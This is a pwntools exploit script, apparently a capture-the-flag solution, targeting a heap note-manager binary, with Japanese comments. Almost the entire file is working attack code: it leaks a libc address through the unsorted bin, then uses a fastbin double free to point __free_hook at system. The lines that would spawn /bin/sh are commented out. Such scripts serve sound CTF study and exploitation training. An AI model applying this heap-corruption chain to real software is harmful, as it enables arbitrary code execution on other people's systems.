from pwn import *

exe = ELF('./heap_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        continue
        b *printf
    """)
elif args.REMOTE:
    io = remote("addr", 1337)

def create_note(index, size, content):
    io.sendlineafter(b'choice >', b'1')
    io.sendlineafter(b'Index >', str(index).encode())
    io.sendlineafter(b'Size >', str(size).encode())
    io.sendlineafter(b'Content >', content)


def delete_note(index):
    io.sendlineafter(b'choice >', b'2')
    io.sendlineafter(b'Index >', str(index).encode())

def view_note(index):
    io.sendlineafter(b'choice >', b'3')
    io.sendlineafter(b'Index >', str(index).encode())
    return io.recvline().strip()

def send_exit():
    io.sendlineafter(b'choice >', b'4')

# ************************************
# libc leak
# ************************************
for i in range(8):
    create_note(i, 0x80, b'AAA')
# top との統合を防ぐ
create_note(8, 0x10, b'avoid merging into top')

# unsorted_bin に入る
for i in range(8):
    delete_note(i)

unsort = int.from_bytes(view_note(7), 'little')
system = unsort - 0x7fecc7e19ce0 + 0x7fecc7c50d60
libc.address = system - libc.sym['system']
print(f'{hex(system) = }')
print(hex(libc.symbols.__free_hook))

# ************************************
# double free
# ************************************
# サイズ0x90のチャンクを消費
for i in range(8):
    create_note(i, 0x80, b'AAA')

# fastbinでdouble free
for i in range(10): 
    create_note(i, 0x10, b'AAA')
# [7], [8] を fastbin に入れる
for i in range(9):
    delete_note(i)

# [7] の double free
delete_note(7)

# [7] -> [8] -> [7] ->
for i in range(8):
    create_note(i, 0x10, pack(libc.symbols.__free_hook))
    print(view_note(i).hex())
# [8] -> [7] -> __free_hook

for i in range(2):
    create_note(i, 0x10, pack(libc.symbols.system))
# __free_hook -> system

# create_note(7, 0x10, pack(libc.symbols.__free_hook))
# create_note(8, 0x10, pack(libc.symbols.__free_hook))
# create_note(7, 0x10, pack(libc.symbols.__free_hook))
# create_note(0, 0x10, pack(libc.symbols.system))

# create_note(0, 0x10, b'/bin/sh')
# delete_note(0)

send_exit()
io.interactive()